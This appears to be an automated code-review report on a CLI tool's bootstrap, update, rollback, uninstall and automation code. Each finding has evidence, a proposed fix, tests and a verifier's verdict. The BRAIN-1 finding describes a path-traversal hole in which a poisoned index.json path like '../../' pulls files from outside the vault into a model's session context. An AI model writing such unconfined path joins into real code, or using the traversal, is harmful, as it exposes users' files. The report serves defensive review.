**Problem.** reached counts a non-idle payloadWriteState, so a failure while in create_intent sets compensationNext = nextPayload. compensate() then treats that cursor as an ordinary payload: it writes payloadRetentionPart "staged_file" and, in the else branch, calls readPayloadEvidence. The grammar refuses that write. retentionEligiblePayload admits cursor === nextPayload only in state "writing", and the dedicated create_intent branch (bootstrap-retention.ts:675-688) allows only create_intent->writing or ->idle with compensationNext-1. Even if the write were accepted, no payload evidence exists yet, so guardReadOwnedFile would throw a raw ENOENT. The window is real: lines 2923-2958 can throw after the create_intent advance from checkpoint after_payload_create_intent (fail hook), from open with O_EXCL (EEXIST/ENOSPC), from syncDirectory, or from the shape refusal at 2949. Any of these leaves rollback permanently unrunnable. The core grammar's create_intent compensation branch has no executor writer.

**Evidence.**

```
const writing = journal.payloadWriteState;
        if (writing.state === "writing" && writing.ordinal === cursor) {
          ...
        } else {
          const evidence = await this.readPayloadEvidence(row);
Grammar, bootstrap-retention.ts:677: `current.payloadWriteState.state === "create_intent" && ... cursor === current.nextPayload && current.payloadRetentionPart === null && next.payloadRetentionPart === null`
```

**Fix.** Before the generic payload branch, handle `journal.payloadWriteState.state === "create_intent" && cursor === journal.nextPayload`. If an empty inode exists at row.ref.path with the exact shape, advance to the grammar's create_intent->writing transition (recording dev/ino) and let the writing path retain it. Otherwise advance payloadWriteState idle with compensationNext cursor-1, as the grammar allows.

**Validation.** Add a failure-injection test with bootstrapFailureAfter: "after_payload_create_intent" and another with "after_payload_empty_create". Expect the journal to reach phase retained / terminalOutcome rolled_back. Today it ends in phase compensating with a refused successor.

**Verifier (confirmed).** The mechanism is confirmed. With payloadWriteState create_intent, reached counts +1, so compensationNext = nextPayload. Compensate then writes staged_file, which the grammar refuses: the create_intent branch at 675-688 requires next.payloadRetentionPart === null, and retentionEligiblePayload (459) admits cursor === nextPayload only in state writing. No executor code writes the grammar's create_intent compensation transitions. Downgraded from high because the trigger is narrow. An interrupt in this window resumes forward correctly, so only a non-interruption error between the create_intent advance (2921) and the writing advance (2952) sticks the rollback: an O_EXCL open failure (EEXIST/ENOSPC/EACCES), a syncDirectory failure, the shape refusal at 2949, or a failed writeJournal. The after_payload_create_intent fail hook only exists in tests. Once triggered, the rollback stays stuck on every retry.

### W2-BOOT-B-3 · logic · Compensation locates consumed payloads only from journal cursors, so a failure after a rename but before the cursor advance strands rollback

`apps/cli/src/bootstrap/executor.ts:3708`

**Problem.** The location to check (retainedPath) is derived from createdPaths.slice(0, nextCreatedPath), launchabilityPaths.slice(0, nextLaunchabilityPath) and foundation participants with ordinal < nextFoundationParticipant. Each of those cursors advances only after its side effect. If a non-interruption error is thrown after createPlannedPath's renameNoReplace (line 3083) but before writeJournal({nextCreatedPath}) (line 3214), the payload has already moved to planned.path, yet compensate looks at row.ref.path. projectBootstrapRetentionPostimage returns null for ENOENT, and compensate throws 'payload changed persisted evidence identity'. Errors in that window include checkpoint after_forward_rename, the assertPlannedParent and assertExactFile refusals, a durableWriteNoReplace failure of creation evidence, and a writeJournal failure. The same happens when executeBootstrapFoundationParticipant (line 3444) fails after publishing the initial journal or any mutation: nextFoundationParticipant is still 0, so the initial-journal payload and the stagedPath consumers are looked up at stale names. The forward Foundation effects are also never compensated, because cursor foundationBase is never reached. Combined with W2-BOOT-B-1, every retry repeats the refusal.

**Evidence.**

```
const reachedConsumer = [
          ...plan.createdPaths.slice(0, journal.nextCreatedPath),
          ...plan.launchabilityPaths.slice(0, journal.nextLaunchabilityPath),
        ].find((candidate) => candidate.kind === "file" && candidate.payload.ordinal === cursor);
        const retainedPath = ... : reachedConsumer?.path ?? row.ref.path;
...
          if (payload?.kind !== "regular_file" || payload.dev !== evidence.dev || payload.ino !== evidence.ino) {
            throw new FreshBootstrapError(EXIT_CODES.securityRefusal, "payload changed persisted evidence identity");
```

**Fix.** Resolve the location by identity rather than by cursor alone. When the cursor-derived path is absent, also probe the next unadvanced consumer (createdPaths[nextCreatedPath], launchabilityPaths[nextLaunchabilityPath], and the forward Foundation finalPath/targetPath when the phase is foundation_applying) and accept the one whose dev/ino matches the payload evidence. Alternatively, record a create/publish intent in the journal before each rename, as payloadWriteState already does for payloads. Retention (deriveBootstrapRetentionLocations) needs the same rule.

**Validation.** Add failure-injection tests with bootstrapFailureAfter: "after_forward_rename" and a fail hook that throws inside the Foundation forward participant. Expect terminalOutcome rolled_back, with the payload inode retained at its actual location. Today the only tested failure points are after_global_lock, during_payload_write and after_foundation.

**Verifier (confirmed).** The mechanism is confirmed for the created-path window. createPlannedPath renames the payload at 3083. Several things can then throw a non-interruption error before createOrdinary advances nextCreatedPath at 3214: assertPlannedParent, the shape check, assertExactFile, durableWriteNoReplace of creation evidence, the creation-evidence identity refusal, or writeJournal. Compensate then derives retainedPath from the cursor and gets row.ref.path. projectBootstrapRetentionPostimage returns null on ENOENT (retention.ts:451), so 3740 throws, and because staged_file was already written, W2-BOOT-B-1 makes the stall permanent. Downgraded from high: the trigger is an I/O failure or tamper refusal in a narrow window, and for a tamper refusal a manual-recovery stop is arguably acceptable. I could not verify the Foundation half of the claim (forward effects are never compensated because foundationBase is never reached, and initial-journal paths are stale) without reading the transaction executor's own rollback, so treat that part as plausible only.

### W2-COMPOSE-1 · logic · update rollback --apply keeps the update's codex/registration.json, so Codex is left `stale` after a successful rollback

`apps/cli/src/update/compose.ts:858` · related: NEW-61

**Problem.** On apply, #withRegistration (line 1182) adds a `replace` of codex/registration.json whose bytes are {codexHome, treeHash} over the Codex owner postimage (P6(d)). That op is added only in the composer. prepareInverse (planning.ts:396) builds the owner inverse only from draft.proposedOperations, so the retained owner_inverse projection has no operation for registration.json. On rollback, #restoreOwners marks every manifest row missing from the retained operations as `keep`. The Codex plugin tree goes back to the previous bytes, but registration.json keeps the update's treeHash. The rollback-direction Codex refresh effect writes no file. inspectCodexRegistration (instructions/codex-registration.ts:153) compares record.treeHash with the installed tree, so after a rollback that changed any Codex file, `doctor` fails with codex-registration `stale`. The next `update` also refuses in codexEffectOf → requireCodexRegistered with update_codex_registration_stale (decisionRequired) until the user re-runs `developer-os init`.

**Evidence.**

```
compose.ts:858-860: `ops.push(restore === undefined ? { operation: "keep", targetPath: row.path, current: row, after: row, before: beforeState(row, observed), observed, content: null } : this.#restoreOp(...))`; compose.ts:1184-1187 (apply only): `if (draft.owner !== "codex" || !changed) return ops.sort(...); ... codexRegistrationRow({ homes, productVersion: this.#input.inputs.target.version, plannedAt: this.#plannedAt, ownerPostimage: postimage })`; planning.ts prepareInverse iterates only `for (const operation of plan.proposedOperations)`; codex-registration.ts:153: `if (input.record.treeHash !== input.treeHash || input.record.codexHome !== input.codexHome) { return "stale"; }`. rollback-apply.test.ts never asserts registration.json or the treeHash after rollback.
```

**Fix.** In #restoreOwners, when the projection owner is codex and any op is non-keep, rewrite the registration row from the restored postimage. Reuse the #withRegistration logic with this.#plannedAt and the rollback target version so the content row is plan_derived `codex_registration_after`, as on apply. Then add the matching +1 to the Codex refCount in updateRollbackPrefixes (and ownerRollbackPreview counts) so allocation stays exact. Alternative: have prepareInverse retain registration.json's preimage. That is harder because the planner never sees codexHome.

**Validation.** Add a rollback-apply/compose test whose retained Codex owner inverse restores a plugin file. Assert that the composed rollback owner plan replaces codex/registration.json with treeHash = codexPluginTreeHash(restored tree), and that inspectCodexRegistration returns `registered` after applyRollback.

**Verifier (downgraded).** Confirmed in code. On apply, #withRegistration (compose.ts:1182-1193) adds the codex/registration.json replace op. prepareInverse (planning.ts:437) builds the retained owner inverse only from plan.proposedOperations, so registration.json has no inverse operation. #restoreOwners (compose.ts:858-860) sets every manifest row with no retained op to `keep`, and #rollbackTransitional (compose.ts:990-) copies kept rows unchanged. The rollback effect (#effectPlan, compose.ts:1369) only swaps the projection hashes and writes no file. The record therefore keeps the update's treeHash while the plugin tree goes back to the previous bytes. inspectCodexRegistration (codex-registration.ts:153) then returns `stale`, and requireCodexRegistered (codex-refresh.ts:155) refuses the next update. Spec P6(d) covers apply only and does not mention rollback. rollback-apply.test.ts never asserts on the record after rollback. No BACKLOG row or known.json entry covers this. Downgraded from high to medium: it is a post-success consistency defect with no data loss, and the refusal names the fix (`developer-os init`).

### W2-GAP-HOST-2 · flow · A scheduled job that launchd cannot spawn is reported as 'never' run; nothing reads launchd's exit status

`apps/cli/src/commands/automation/service.ts:1042` · related: NEW-138, NEW-134

**Problem.** Run evidence comes only from the status file the runner writes after it starts. Both plist sinks are /dev/null, so a spawn or exec failure (W2-GAP-HOST-1), a Node crash before the runner writes status, or a missing node all look identical to 'not yet scheduled'. `automation status` prints `never`, and doctor does not check. launchd itself records `runs = N` and `last exit code` (and a penalty box), but the product's observe step reads only the label, program and arguments. That is how W2-GAP-HOST-1 went unnoticed on the founder machine, where launchd has recorded `runs = 1` since 2026-10-04.

**Evidence.**

```
service.ts:1042: `if (entry === null || (entry.kind === "regular_file" && entry.size === "0")) return null;`. index.ts:123: `const last = job.lastRun === null ? "never" : ...`. plist.ts:154-156: `StandardOutPath: "/dev/null", StandardErrorPath: "/dev/null"`. `grep -rn "last exit" packages/platform-macos/src apps/cli/src` finds no production match.
```

**Fix.** Have the observe step's `launchctl print` parse `runs` and `last exit code` too; the output format is already pinned for D82. Report `spawn_failed (exit N)` in `automation status` whenever launchd has runs > 0 and no status record exists, or its last exit code is non-zero and newer than the record. Have doctor fail on it.

**Validation.** Fake launchctl print output with `runs = 1` and `last exit code = 78` plus an empty status file makes `automation status` print a spawn failure and makes doctor fail. On the founder host today, before W2-GAP-HOST-1 is fixed, the same command must flag all four loaded jobs.

**Verifier (downgraded).** The evidence holds. service.ts:1042 maps a missing or 0-byte status file to null, and index.ts:123 prints 'never'. Both sinks are /dev/null. A grep finds no production parser for launchd's 'last exit code' or 'runs', and doctor.ts never mentions automation. This is an observability gap, though, not a functional defect. Its impact comes from hiding W2-GAP-HOST-1, and fixing that finding removes the current trigger. Downgraded from high to medium.

### W2-GAP-STATE-1 · flow · status reports a V2 home with an interrupted update or uninstall as clean

`apps/cli/src/commands/status.ts:89` · related: FLOW-UNINST-1, FLOW-UPD-2, FLOW-UNINST-1 (doctor half)

**Problem.** `status` reads only V1 executor journals under `<state>/transactions/`. It never reads the V2 coordinator state: `state/lifecycle-journals/*` (core update/paths.ts:197), `state/update-executor.json` (paths.ts:258) or the `state/uninstalling.json` marker (lifecycle/runtime-records.ts:318). The admission gate that runs before `status` (main.ts:738 -> report.ts:1673) checks only bootstrap plan envelopes. On a home where `update --apply` or `uninstall` stopped mid-coordinator, `status` prints `installed: true`, `incompleteTransactions: []` and no warning. Yet `status` is documented as 'the command a confused machine is asked first'. FLOW-UNINST-1 covers the same blindness in `doctor`, for uninstall only. This is the `status` surface, and it also covers update coordinators.

**Evidence.**

```
status.ts:89 `const incomplete = await listIncompleteTransactions(context);` -> doctor.ts:265 `const journalDir = join(context.paths.stateDir, "transactions");`. A grep for `lifecycle-journals|update-executor|uninstalling` in status.ts and doctor.ts finds nothing. The marker reader `uninstallingMarkerPresent` exists (runtime-records.ts:327) and is used only by automation/runner.ts.
```

**Fix.** Add a read-only V2 survey for `status` (and `doctor`, with FLOW-UNINST-1): report `uninstallingMarkerPresent(...)`, the presence of `update-executor.json`, and every non-closed coordinator journal (classifyLifecycleJournalClosureV2 / the ledger scan in core lifecycle/ledger-v2.ts). Surface them as a new field or as warnings, and name the recovery command.

**Validation.** Unit test: in a V2 fixture home, write `state/uninstalling.json` and a non-terminal `state/lifecycle-journals/<id>.json`. `runStatus` must name both. Today it returns `incompleteTransactions: []` with no warning.

**Verifier (confirmed).** status.ts:89 calls only listIncompleteTransactions, and doctor.ts:265 scans only <state>/transactions/. status is not routed through admitInstalledV2Home (lifecycle/admission.ts), and the main.ts:738 gate checks only bootstrap envelopes. uninstallingMarkerPresent, lifecycle-journals and update-executor are read only by update/*, lifecycle/*, bootstrap/executor and automation/runner, never by status. This is not a duplicate: FLOW-UNINST-1 covers only doctor and only uninstall. The fix overlaps that item's root cause, so the two should share one V2 survey helper.

### W2-PLANNER-1 · logic · Expected-manifest draft has no instruction arm, so attached instruction rows cannot survive an update

`packages/core/src/update/planner.ts:812` · related: NEW-111, NEW-118

**Problem.** The planner request admits instruction rows. ARTIFACT_KINDS includes "instruction", and parseObserved accepts `row.kind === "instruction"` with content/block modes. The CLI snapshot (apps/cli/src/update/context.ts:356-372) sends every manifest row, including the instruction rows that apps/cli/src/instructions/attach.ts writes. But PlannerManagedArtifactDraftV2 (lines 194-199) and parseExpectedManifest (790-812) accept only the file, directory and symlink arms. PlannerManifestArtifactV1 (98-107) also drops the `instruction` identity field, so a target could not reproduce it even if an arm existed. A draft that keeps an installed instruction row therefore fails admission. A draft that omits the row makes compose fail (participants.ts:348: keep requires a non-null afterArtifact). Any home with an attached instruction is not updatable. A draft that relabels a content-mode instruction token as `kind: "file"` is admitted at this layer, because installedToken never checks the token's kind. Whether manifest admission then catches it depends on admitOwnerPath for the file arm at that path, which I did not trace, so the identity could be silently lost. No target-side expected-manifest builder exists yet (NEW-111), so this defect is latent until Task 11b.

_Merged W2-PLANNING-1 (apps/cli/src/update/planning.ts:335): Concrete manifest row set comes only from the target draft; kept rows can vanish and instruction rows always do._

**Evidence.**

```
planner.ts:280 `const ARTIFACT_KINDS: readonly ManagedArtifactV2["kind"][] = ["file", "directory", "symlink", "instruction"];`
planner.ts:438 `const regular = (row.kind === "file" && (mode === "content" || mode === "schema")) || (row.kind === "instruction" && (mode === "content" || mode === "block"));`
planner.ts:806-812 `if (artifact.kind === "symlink" && verification.mode === "content") { ... }
    return fail(`${rowLabel}.kind`);`
manifest/v2.ts:47 `exact(value, arm.kind === "instruction" ? [...COMMON_KEYS, "instruction"] : COMMON_KEYS);`
```

**Fix.** Pick one of two options. (a) Add an instruction arm to PlannerManagedArtifactDraftV2 and parseExpectedManifest that may only keep an installed instruction token in place: require the path token's kind to be instruction with the same mode. Have the CLI concreteManifest copy `instruction` from the prior row instead of accepting it from the target. (b) Exclude instruction rows from the planner request and carry them through the current process unchanged. In either case, make installedToken-based arms check that the source token's kind equals the drafted kind.

**Validation.** Add planner tests: admitTargetUpdateDraft accepts a keep of an instruction token as an instruction row; it refuses an expectedManifest row that relabels an instruction token as kind "file". Add a CLI test: a home with an attached content-mode instruction updates and still has the identical `instruction` field in the post-update manifest.

**Verifier (confirmed).** Verified. planner.ts:194-199 PlannerManagedArtifactDraftV2 and parseExpectedManifest (lines 790-812) have only file, directory and symlink arms. Every other shape reaches `return fail(`${rowLabel}.kind`)`. The planner request still carries instruction rows: ARTIFACT_KINDS at line 280 includes them, parseObserved accepts them at line 438, and apps/cli/src/update/context.ts:356-372 maps every manifest row. attach.ts:333/384 writes kind "instruction" rows. On the CLI side, concreteManifest (planning.ts:325-374) also has no way to rebuild the `instruction` identity field, and PlannerManifestArtifactV1 (planner.ts:98-107) drops that field. So no home with an attached instruction can produce an admissible draft plus manifest. docs/architecture/claude-adapter.md:643-646 records only that the arm is missing, as a proof-scope note ("not covered by that proof"). It does not say such homes cannot be updated, and no NEW row tracks this. The defect stays latent until Task 11b, because the production composer refuses update_fallback_unavailable today (NEW-111). The relabel sub-claim, that installedToken never checks the token's kind, is correct for installedContent at lines 782-788. Whether manifest admission later catches the relabel was not traced, so that part is unproven.

### W2-ROLLBACK-1 · flow · exactStepListHash is write-only: manual rollback never compares it with the step list it executes

`packages/core/src/update/rollback.ts:515` · related: NEW-111

**Problem.** Spec 2 says of BoundedUpdateInversePlanV1.exactStepListHash: "At manual rollback it equals the canonical outer `steps` array byte-for-byte". The test matrix line 5111 also requires "exact rollback-step-list digest mutation/reorder/self-reference vectors". Core only parses the field as a hash. update_apply writes it (compose.ts:1450), but the rollback composition (compose.ts:755-830) and readRollbackEvidence (context.ts:430-500) never recompute it from deriveUpdateSteps(update_rollback) or compare it. A rollback run by a newer release whose step derivation drifted from the one the payload was built for therefore proceeds with a different step list instead of refusing.

_Merged W2-COMPOSE-2 (apps/cli/src/update/compose.ts:1450): Retained exactStepListHash is written at apply but never compared with the rollback outer steps._

**Evidence.**

```
rollback.ts:515 `for (const key of ["rollbackBindingHash", "installedReleaseIdentityHash", "previousReleaseIdentityHash", "exactStepListHash"]) parseLowerHexSha256(input[key]);` is the only read. Searching apps/cli/src for `exactStepListHash` finds only compose.ts:1450 (the write) and fixtures. context.test.ts:204 uses `exactStepListHash: sha256("synthetic rollback step list")` and still expects readRollbackEvidence to succeed ("reads a hash-checked payload whose postimage is still current"). rollback-testing.ts:259 binds `rollbackStepListHash([{ participant: "bundle", transition: "verify_previous" }])`, which is not the derived template, and is consumed without complaint.
```

**Fix.** In the update_rollback composition, after it derives the rollback steps from the retained owners and migrations, compute rollbackStepListHash(steps) and refuse (update_rollback_evidence_invalid, exit 6) unless it equals the retained inverse plan's exactStepListHash. To do that, expose inversePlan.exactStepListHash through RetainedRollbackEvidenceV1. Fix the fixtures so they bind the real derived template.

**Validation.** Add a context or compose test with a mutated exactStepListHash and one with a reordered step list; both must refuse before any mutation. The existing happy-path rollback tests must still pass once the fixtures use the derived hash.

**Verifier (confirmed).** Verified. rollback.ts:515 only parses exactStepListHash. The only production write is compose.ts:1450 (rollbackStepListHash(deriveUpdateSteps(update_rollback ...))). The update_rollback composition (compose.ts:740-840) and readRollbackEvidence (context.ts:430-509) never read the field: grep finds no other consumer in apps/ or packages/ outside tests and fixtures. Spec 2 line 4451-4453 says 'At manual rollback it equals the canonical outer `steps` array byte-for-byte', and test-matrix row 5111 asks for mutation/reorder vectors. The scenario is reachable. The payload is composed by the release that runs update --apply, while rollback runs on the installed release, so cross-release drift in step derivation is exactly what the hash would catch. context.test.ts:204 accepts a synthetic hash. Not tracked in BACKLOG; NEW-111 is related only loosely. Medium is fair: the check is integrity-only, and the steps still come from hash-verified retained plans.

### W2-SEC-UPD-1 · flow · recoverCleanup cleans live attempts of a concurrent process: 'after process death' is never proven

`packages/security/src/update/scratch.ts:1052`

**Problem.** listRecoverableAttempts lists every attempt that has a journal, and recoverCleanup runs the full cleanup on it. Nothing checks that the owning process is dead: there is no lock, pid, or claim. The CLI calls this sweep at the start of every plan-only `update` and every `update --apply` preview (planning.ts:598 cleanScratchResidue). It runs before any lock, and prepareUpdate's download, extract and planner run also happen outside the global lock. A second `developer-os update` started while another invocation is downloading, extracting, or applying from its retained `verified.root` will rewrite the victim's journal to `cleaning` and delete its archive and extracted entries. If the victim is mid-entry (create_intent with the path present), the sweeper instead hits `release_scratch_unrecorded_path`. That journal is now frozen at `cleaning`, so every later `update` fails at cleanScratchResidue with exit 6 until someone cleans up by hand. The victim's own next `#update` fails because its in-memory `#journalEntry` identity is stale.

**Evidence.**

```
scratch.ts:1047-1052 `/** Cleanup-only recovery after process death. ... */ async recoverCleanup(id: ReleasePlanningAttemptIdV1): Promise<void> {` and 1090 `await new ReleasePlanningScratchAttempt(this.dependencies, plan, sha256(planBytes), parent, journal, journalEntry).cleanup();`. scratch.ts:1035-1044 lists any `.journal.json` match. Caller planning.ts:274-276 `async function cleanScratchResidue(update) { for (const id of await update.scratch.listRecoverableAttempts()) await update.scratch.recoverCleanup(id); }` is invoked at planning.ts:598 before the transport, with no withGlobalLock. Spec §7.2 (design.md:2365) scopes this recovery to 'After process death'.
```

**Fix.** Give each attempt a liveness claim that recovery must take before cleaning. Option 1: the attempt holds an exclusive flock (or an O_EXLOCK-opened file) on its journal or a sibling lock file for its lifetime, and recoverCleanup try-locks it non-blocking and skips (does not refuse) an attempt it cannot lock. Option 2: run cleanScratchResidue and prepareUpdate's scratch lifetime under the global lifecycle lock. Option 1 keeps plan-only update lock-free.

**Validation.** Add a scratch.test case: create attempt A and stop it at `entry_recorded` via afterBoundary. From a second store on the same systemTemp, call listRecoverableAttempts plus recoverCleanup. Expect A's journal and files untouched. Then resume A to `verified` and cleanup successfully.

**Verifier (downgraded).** Confirmed in code. scratch.ts:1035-1090: listRecoverableAttempts returns every attempt that has a `.journal.json`, and recoverCleanup cleans it with no liveness claim (the file has no lock, flock or pid). planning.ts:598 calls cleanScratchResidue before any lock, and commands/update/index.ts:98 runs prepareUpdate outside withGlobalLock, which only wraps applyUpdate (apply.ts:152). So a second concurrent `developer-os update` cleans the first one's live attempt. If the victim is at create_intent with the path present, cleanup refuses at scratch.ts:849/873 (`release_scratch_unrecorded_path`). That leaves a journal frozen at `cleaning`, which every later sweep hits again. Spec §7.2 (design.md:2365) scopes this recovery to 'after process death', and no BACKLOG row or known.json entry covers it. Downgraded from high to medium: it needs two update invocations at once by the same user. The first effect is a failed attempt and residue to clean by hand, not product or home corruption.

### W2-TX-B-1 · flow · resume/rollback accept bootstrap Foundation ids and rewrite the journal by rename, breaking its inode binding

`packages/core/src/transactions/executor.ts:2136`

**Problem.** The public `resume(id)` and `rollback(id)` route any id through `resumeLocked`/`rollbackLocked` → `this.transition` → `store.transition` → `store.write`, which writes `.<id>.<token>.json.tmp` and renames it over the journal, so the journal gets a new inode. A bootstrap Foundation participant journal (`tx_fi_<uuid>_<n>_{f|c}`) lives at the same `<state>/transactions/<id>.json` path (validateBootstrapFoundationBridgeInput 1357-1361). Its state machine treats the original inode as the rewrite authority: `transitionBootstrapFoundationInPlace` (2997-3006) and `restoreBootstrapFoundationInitialJournalByIdentity` (1129-1130) both refuse when `ino !== identity.ino`. Nothing filters these ids on the recovery path. doctor.ts:276-278 lists every `*.json`, and doctor.ts:1045 and init.ts:586 print `developer-os repair --resume <id> | developer-os repair --rollback <id>`. init.ts:873 runs `assertNoIncompleteTransaction` before the bootstrap-resume path at init.ts:898+. repair.ts:15 accepts `/^[A-Za-z0-9._-]+$/`. Result: after a crash that leaves a `tx_fi_…_f` journal non-terminal, the product's printed recovery command runs the generic path. Its first transition (planned→backed_up after `backUp`) re-inodes the journal before anything else can fail. From then on the bootstrap coordinator's identity-bound resume refuses with exit 6, permanently. For `--rollback` the same entry point applies; at validated/applied/verified it fails reading backup metadata that the bootstrap state machine never wrote, while at planned/backed_up/staged it re-inodes the journal into rolled_back.

**Evidence.**

```
async resume(id: string): Promise<TransactionJournalV1> {
    return this.store.withTransactionLock(id, () => this.resumeLocked(id));
  }
...
store.ts:346  await this.fs.rename(temporary, destination);
...
executor.ts:3004-3005  linkedBefore.dev.toString(10) !== identity.dev ||
        linkedBefore.ino.toString(10) !== identity.ino
...
doctor.ts:1045  `developer-os repair --resume ${first.id} | developer-os repair --rollback ${first.id}`,
```

**Fix.** Refuse Foundation-bound ids (BOOTSTRAP_FOUNDATION_ID_RE, and the lifecycle/update participant id shapes if they carry an in-place identity) in `resume`/`rollback` with a typed recovery-required error that points at `init` as the bootstrap resume route. Alternatively, have doctor/init exclude `tx_fi_` journals from the generic incomplete-transaction survey and let the bootstrap evidence path report them. Related: CORE-LIFE-1 (an adjacent stuck-coordinator class in lifecycle/coordinator.ts).

**Validation.** Unit test: create a `tx_fi_<uuid>_0000000000_f` journal at phase `planned` through the store fixture, lstat its ino, call `executor.resume(id)` (or `recoverTransaction({action:'resume'})`), and assert the ino changed or the call refused. Then assert that `executeBootstrapFoundationParticipant` on the same admitted input throws TransactionStateError. An e2e check: SIGKILL a fresh `init` mid-publication, run `doctor`, and confirm it recommends `repair` for a `tx_fi_` id. PLAUSIBLE: no probe was run, and I did not rule out a bootstrap-side tombstone that moves the journal out of `<state>/transactions/` first.

**Verifier (confirmed).** I traced the chain in code. `resume`/`rollback` (executor.ts 2136-2137, 2204-2205), `recoverTransaction` (recovery.ts 7-18) and `runRepair` (repair.ts 15, 64-118) apply no Foundation-id filter. repair checks only `/^[A-Za-z0-9._-]+$/` and that the phase is not the opposite terminal phase. `surveyTransactions` (doctor.ts 308-327) lists every non-terminal `*.json` with no `tx_fi_` exclusion. doctor.ts 1045 and init.ts 586 print `repair --resume/--rollback <id>`. init.ts 873 runs `assertNoIncompleteTransaction` before the bootstrap evidence/resume path, so a non-terminal `tx_fi_` journal sends the user to the generic repair route. `store.write` (store.ts 325-346) uses the same `encodeFoundationJournalJsonV1`, so `store.read` accepts the journal. `store.write` replaces the file by temp file + rename, which gives it a new inode. `transitionBootstrapFoundationInPlace` (3004-3005) refuses on `ino !== identity.ino`. The bootstrap coordinator calls `executeBootstrapFoundationParticipant` (bootstrap/executor.ts 3444, 3682) without moving the journal out of `<state>/transactions/` first. No test pins `resume` against a `tx_fi_` id. This duplicates nothing in known.json or BACKLOG. Kept PLAUSIBLE-level medium: the code-level chain holds, but no end-to-end crash probe was run.

### W2-UNINST-1 · logic · Uninstall plans artifacts from the manifest admitted before the lock, but pins the M arm to the live manifest hash

`apps/cli/src/lifecycle/uninstall.ts:1463`

**Problem.** `dispatchUninstall` admits the V2 home and reads the manifest without holding the global lock. `execute` takes the lock later and runs a recovery pass that resumes every active coordinator. `preview` then builds the removal set from `request.admitted.manifest`, which may be stale. In the same call, `manifestHash`/`manifestBefore` come from a fresh read of the live file. Nothing checks that the two describe the same bytes. If the manifest changed in that window (an `update --apply` or `automation enable` committed while the user sat at the confirm prompt, or the recovery pass finished an interrupted coordinator's manifest arm), the coordinator tombstones the new manifest but removes only the old artifact set. Rows that only the new manifest has, including plist rows the launchd variant would have booted out, are orphaned with no manifest left to index them. finalizeUninstallTombstones then rmdirs directories from the new manifest whose files were never removed.

**Evidence.**

```
line 1436: `const variant = await deriveVariant(request, paths, admitted.manifest);`
line 1463: `admitted.manifest.artifacts`
line 1531: `manifestHash: await lifecycle.fs.hashRegular(manifestBefore, BigInt(MAX_MANIFEST_BYTES)),`
lines 1585-1587: `await lifecycle.recovery(request.key, adapters, residue).recover(current(), { resumeUninstall: true });` (core recovery.ts:101 executes every active coordinator)
uninstall-recovery.ts:156: `return { kind: "v2_coordinator", admitted: await admitV2Home(context, lifecycle, paths) };` (no lock held)
commands/uninstall.ts:811: `if (detach === null) return success(await uninstaller.execute(request(admitted)));` (admitted before the confirm prompt)
```

**Fix.** Inside `preview`, under the held global lock and after recovery, re-read the manifest bytes once. Decode and validate them, and use that single manifest both for the artifact partition and for `manifestHash`. Alternatively, carry the admitted bytes' hash in AdmittedV2HomeV1 and refuse with a pre-reservation error when it differs from the hash computed at line 1531.

**Validation.** Add a v2 test. Admit a home, then rewrite the manifest with one extra file row (as `update` would) before calling `execute`. The test fails today because the extra file survives a finalized uninstall. After the fix, the run either removes the file or refuses before `reserveLifecycleIdBlock`.

**Verifier (downgraded).** The core claim holds. execute() never re-admits the manifest under the global lock. preview() partitions `admitted.manifest.artifacts` (uninstall.ts:1463), which commands/uninstall.ts:811/823 admitted before the lock and before the confirm prompt. At 1531, `manifestHash` hashes the live file and nothing compares the two. The mutation gate (mutation-gate.ts:531-537) does re-admit under the lock and checks lock identity, so uninstall is inconsistent with it. Two parts of the claim are overstated. (1) The recovery-pass path is refuted: recovery runs with the uninstall adapters, whose `manifest.publishAfter` refuses (`lifecycle_coordinator_manifest_arm`, uninstall.ts:1021), so an interrupted update or automation coordinator cannot commit a new manifest there and the run refuses instead. (2) What remains needs a concurrent `update --apply` or `automation enable` from another terminal while the prompt is open, or in the short admission-to-lock window. Rows whose content changed are still caught by planUninstall's drift refusal (commands/uninstall.ts:433-441, decision-required), so only rows newly added to the manifest (for example plist rows) are orphaned. It is real, but it is a race, so medium.

## P3

### BRAIN-1 · security · sessionContext reads a path taken from index.json without confining it to the vault

`packages/brain/src/service.ts:297`

**Problem.** `parseIndexDocument` only checks that `note.path` is a string. `sessionContext` then does `join(vaultRoot, match.path)` and reads that file, and the hook injects the text into the model's session context. A poisoned `index.json` in a synced or cloned vault can set `path` to `../../<anything>` on a `project-note` whose title or alias equals the project slug. The only guard is `assertReadable`, which is the protected-path policy (`~/.ssh` and similar), not vault confinement. Any other readable user file is then injected into the session. No test covers a hostile path.

**Evidence.**

```
service.ts:297-302: `const path = join(this.deps.vaultRoot, match.path); await this.deps.assertReadable(path); return { vaultMap, projectNote: { title: match.title, text: await this.deps.readFile(path) } };`. `parseIndexDocument` (~l.120-160) validates `path` with `typeof note[field] !== "string"` only. apps/cli/src/commands/brain-dependencies.ts:36 maps `assertReadable` to `context.guards.manifest.assertReadable`, which is `ProtectedPathPolicy.assertReadable` (apps/cli/src/context.ts:388). apps/cli/src/hooks/inject.ts:49 calls `service.sessionContext(...)`. Grep of service.test.ts for `../`, traversal or escap returned nothing.
```

**Fix.** In `parseIndexDocument` (or in `sessionContext`), reject any note whose `path` is not `<contentRoot>/...*.md`, contains an empty, `.` or `..` segment, or whose joined path is not contained in `join(vaultRoot, contentRoot)`. `isUnsafeProposedNotePath` plus a `contentRoot/` prefix check would do. Return `{vaultMap, projectNote: null}` or treat the index as unreadable.

**Validation.** Add a service test with an index whose project-note path is `content/../../outside.md`. Expect `projectNote: null` and `readFile` never called with the escaped path. Also test an absolute path and a `.` segment.

**Verifier (downgraded).** The code is as quoted. service.ts:297-302 joins vaultRoot with match.path from index.json, and parseIndexDocument (l.142-160) checks only that path is a string. readFile goes through guards.readText (protected-path policy, O_NOFOLLOW), not vault confinement, so a `../` path does escape the vault. No BACKLOG row tracks it. Severity is overstated, though. An attacker who can write index.json can already write vault-map.md and the project note that inject puts into the session verbatim, so the only added capability is pulling a readable file from outside the vault into the user's own agent context. ~/.ssh-class secrets are still refused by the protected-path policy, and nothing goes to the attacker directly. This is a real defense-in-depth gap at low severity.

### BRAIN-3 · flow · Garden `fix` proposals are parsed, validated and advertised in the output schema but never requested or target-selected

`packages/brain/src/garden/bundle.ts:36` · related: NEW-134

